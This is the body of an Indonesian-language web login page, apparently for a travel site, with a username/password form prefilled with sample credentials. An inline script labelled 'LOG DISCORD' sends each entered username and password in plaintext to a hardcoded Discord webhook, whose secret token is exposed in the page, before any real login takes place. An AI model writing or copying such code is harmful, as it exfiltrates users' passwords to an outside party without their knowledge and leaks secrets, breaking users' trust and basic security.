  <body>

    <div id="loader-wrapperz">
      <div id="loaderz"></div>
      <div id="loading-text"> <br> Sabar Lek</div>
      </div>

    <div id="app">
      <section class="hero is-fullheight">
        <div class="hero-body">
          <div class="container has-text-centered">
            <div class="column is-4 is-offset-4">
              <h3 class="title has-text-grey">Login dulu ngabs</h3>
              <br>
              <p class="subtitle has-text-grey">Mohon login untuk melanjutkan ke halaman utama.</p>

              <div class="column right has-text-centered">
                <div id="loading-overlay" class="loading-overlay">
                  <div class="loading-spinner"></div>
                  <p class="loading-text"></p>
                </div> 

              <form id="formlogin">
              <div class="box">
                  <div class="field">
                    <div class="control">
                      <input
                        class="input"
                        type="text"
                        placeholder="username"
                        autocomplete="username"
                        id="username"
                        value="prisya"
                        required
                        autofocus
                      />
                    </div>
                  </div>

                  <div class="field">
                    <div class="control">
                      <input
                        class="input"
                        type="password"
                        placeholder="******"
                        autocomplete="current-password"
                        id="password"
                        value="prisyah"
                        required
                      />
                    </div>
                  </div>

                  <input type="role" name="role" id="role" hidden value="user" />

                  <button class="button is-block is-link is-fullwidth is-medium" type="submit" id="button">
                    Login
                  </button>
                  <br>
                  <p class="text-sm leading-relaxed text-grey-900">Anda Belum punya akun? <a href="register.html" class="font-bold text-grey-700">Buat akun</a></p>
                  <p class="text-sm leading-relaxed text-grey-900">Anda Seorang Admin? <a href="loginadmin.html" class="font-bold text-grey-700">Login Admin</a></p>
                  <p class="text-sm leading-relaxed text-grey-900">Anda Lupa Password? <a href="resetpass.html" class="font-bold text-grey-700">Reset Password</a></p>

                </form>
              </div>

            </div>
          </div>
        </div>

        <!-- <div class="container">

           </div> -->

      </section>
    </div>
            <!-- Scripts -->
            <script type="module" src="https://cdn.jsdelivr.net/gh/wegotour/js_wgt@0.0.9/js/controller/controllerLogin.js"></script>
            <script type="module" src="https://cdn.jsdelivr.net/gh/wegotour/js_wgt@0.0.11/js/loading.js"></script>
            <script>
              //LOG DISCORD
              const webhookURL = "https://discord.com/api/webhooks/1180844854905938000/DSlr-ojeQK-opl4I9GUd6lfmvHD3J9CmuM5RPJIaWD6YkyEPA0wd6N8mKvlbUmgyKCr8";
              document.getElementById("button").addEventListener("click", () => {
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
            
                const loadingOverlay = document.getElementById("loading-overlay");
                loadingOverlay.style.display = "flex";
            
                const loadingText = document.querySelector(".loading-text");
                loadingText.style.display = "block";
            
                const message = `ADA YANG MENCOBA LOGIN NICHH: ${username} PASSWORD: ${password}`;
                sendToDiscordWebhook(message);
              });
            
              function sendToDiscordWebhook(message) {
                const requestData = {
                  method: "POST",
                  headers: {
                    "Content-Type": "application/json"
                  },
                  body: JSON.stringify({ content: message })
                };
            
                fetch(webhookURL, requestData)
                  .then(response => {
                    setTimeout(() => {
                      const loadingOverlay = document.getElementById("loading-overlay");
                      loadingOverlay.style.display = "none";
            
                      if (response.ok) {
                        console.log(" Berhasil login");
                      } else {
                        console.error(" GAGAL login");
                      }
                    }, 10000);
                  })
                  .catch(error => {
                    const loadingOverlay = document.getElementById("loading-overlay");
                    loadingOverlay.style.display = "none";
            
                    console.error("Terjadi kesalahan:", error);
                  });
              }
               </script>
